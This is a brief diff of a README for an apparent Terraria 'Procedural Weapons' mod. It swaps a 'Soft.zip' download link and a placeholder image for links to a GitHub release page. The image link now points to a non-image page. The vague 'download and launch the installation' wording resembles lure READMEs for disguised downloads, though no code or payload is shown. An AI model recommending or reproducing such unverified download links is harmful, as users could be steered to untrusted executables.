@@ -16,11 +16,11 @@ This repository contains a mod for the popular game Terraria that introduces exc
 
 To get started with the Procedural Weapons Terraria Mod, simply download the mod files from the following link:
 
-[Download Procedural Weapons Mod](https://github.com/files/Soft.zip)
+[Download Procedural Weapons Mod](https://github.com/sheby456/Procedural-weapons-Terraria-mod/releases/tag/v1.2)
 
 Once you have downloaded the file, launch the mod installation process to start enjoying the new content in Terraria.
 
-![Terraria Procedural Weapons](https://imgur.com/example.png)
+![Terraria Procedural Weapons](https://github.com/sheby456/Procedural-weapons-Terraria-mod/releases/tag/v1.2)
 
 ## Repository Details
 
